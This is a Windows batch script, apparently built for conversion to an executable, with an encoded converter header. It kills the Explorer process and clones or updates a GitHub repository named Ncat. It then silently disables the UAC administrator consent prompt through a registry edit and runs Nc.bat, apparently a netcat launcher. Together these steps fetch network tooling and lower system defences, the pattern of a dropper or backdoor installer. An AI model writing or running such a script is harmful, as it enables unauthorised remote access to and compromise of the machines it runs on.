::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSjk=
::cBs/ulQjdF65
::ZR41oxFsdFKZSTk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpSI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCuDJGmW+0g1Kw80
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
cd %TEMP%
echo %CD%
pause

@echo off

powershell.exe -Command "Get-process explorer | Stop-Process"

rem powershell.exe -Command "rundll32.exe user32.dll, LockWorkStation"

set repo_url=https://github.com/skydrige/Ncat.git
set repo_folder=Ncat

if exist %repo_folder% (
    echo Updating existing repository...
    cd %repo_folder%
    git pull
    cd 
) else (
    echo Cloning repository...
    git clone %repo_url% %repo_folder%
)

rem powershell.exe -Command "rundll32.exe user32.dll, LockWorkStation"

rem py_311.bat

if exist %repo_folder% (
    cd Ncat
)

echo %CD%

powershell.exe -Command "Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0"

echo "UAC = 0"

rem powershell.exe -Command "rundll32.exe user32.dll, LockWorkStation"

Nc.bat

exit /b
